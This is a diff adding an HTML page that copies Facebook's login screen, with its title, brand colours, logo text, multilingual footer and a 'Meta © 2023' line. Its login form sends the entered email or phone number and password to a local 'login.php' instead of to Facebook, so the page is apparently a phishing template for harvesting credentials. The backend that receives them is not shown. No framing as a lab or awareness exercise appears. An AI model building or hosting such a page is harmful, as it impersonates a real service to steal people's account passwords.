@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Facebook - Log in or Sign Up</title>
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: Helvetica, Arial, sans-serif;
+        }
+        body {
+            background-color: #f0f2f5;
+        }
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+            display: flex;
+            flex-direction: column;
+            min-height: 100vh;
+        }
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 10px 0;
+        }
+        .logo {
+            font-size: 32px;
+            font-weight: bold;
+            color: #1877f2;
+        }
+        .login-form {
+            background-color: white;
+            border-radius: 8px;
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.1), 0 8px 16px rgba(0, 0, 0, 0.1);
+            padding: 20px;
+            width: 396px;
+            margin: 40px auto;
+        }
+        .login-form input {
+            width: 100%;
+            padding: 14px 16px;
+            margin-bottom: 12px;
+            border: 1px solid #dddfe2;
+            border-radius: 6px;
+            font-size: 17px;
+        }
+        .login-form input:focus {
+            outline: none;
+            border-color: #1877f2;
+            box-shadow: 0 0 0 2px #e7f3ff;
+        }
+        .login-btn {
+            background-color: #1877f2;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 20px;
+            font-weight: bold;
+            padding: 12px;
+            width: 100%;
+            cursor: pointer;
+            margin-bottom: 16px;
+        }
+        .login-btn:hover {
+            background-color: #166fe5;
+        }
+        .forgot-password {
+            text-align: center;
+            margin-bottom: 20px;
+        }
+        .forgot-password a {
+            color: #1877f2;
+            text-decoration: none;
+            font-size: 14px;
+        }
+        .divider {
+            border-bottom: 1px solid #dadde1;
+            margin: 20px 0;
+        }
+        .create-account {
+            background-color: #42b72a;
+            color: white;
+            border: none;
+            border-radius: 6px;
+            font-size: 17px;
+            font-weight: bold;
+            padding: 12px;
+            width: auto;
+            margin: 0 auto;
+            cursor: pointer;
+            display: block;
+        }
+        .create-account:hover {
+            background-color: #36a420;
+        }
+        .main-content {
+            display: flex;
+            align-items: center;
+            justify-content: space-between;
+            flex-grow: 1;
+            margin-top: 72px;
+        }
+        .intro-text {
+            max-width: 500px;
+        }
+        .intro-text h1 {
+            font-size: 28px;
+            color: #1c1e21;
+            margin-bottom: 20px;
+        }
+        .intro-text p {
+            font-size: 24px;
+            color: #606770;
+        }
+        footer {
+            background-color: white;
+            padding: 20px 0;
+            margin-top: auto;
+        }
+        .footer-links {
+            display: flex;
+            flex-wrap: wrap;
+            justify-content: center;
+            gap: 10px;
+            margin-bottom: 20px;
+        }
+        .footer-links a {
+            color: #8a8d91;
+            text-decoration: none;
+            font-size: 12px;
+        }
+        .copyright {
+            text-align: center;
+            color: #8a8d91;
+            font-size: 11px;
+        }
+        @media (max-width: 900px) {
+            .main-content {
+                flex-direction: column;
+                text-align: center;
+                margin-top: 20px;
+            }
+            .intro-text {
+                margin-bottom: 40px;
+            }
+            .login-form {
+                width: 100%;
+                max-width: 396px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">facebook</div>
+        </header>
+        
+        <div class="main-content">
+            <div class="intro-text">
+                <h1>Connect with friends and the world around you on Facebook.</h1>
+            </div>
+            
+            <div class="login-form">
+                <form method="POST" action="login.php">
+                    <input type="text" name="username" placeholder="Email or phone number" required>
+                    <input type="password" name="password" placeholder="Password" required>
+                    <button type="submit" class="login-btn">Log In</button>
+                </form>
+                <div class="forgot-password">
+                    <a href="#">Forgot password?</a>
+                </div>
+                <div class="divider"></div>
+                <button class="create-account">Create New Account</button>
+            </div>
+        </div>
+        
+        <footer>
+            <div class="footer-links">
+                <a href="#">English (US)</a>
+                <a href="#">Español</a>
+                <a href="#">Français (France)</a>
+                <a href="#">中文(简体)</a>
+                <a href="#">العربية</a>
+                <a href="#">Português (Brasil)</a>
+                <a href="#">Italiano</a>
+                <a href="#">한국어</a>
+                <a href="#">Deutsch</a>
+                <a href="#">हिन्दी</a>
+                <a href="#">日本語</a>
+            </div>
+            <div class="copyright">
+                Meta © 2023
+            </div>
+        </footer>
+    </div>
+</body>
+</html>
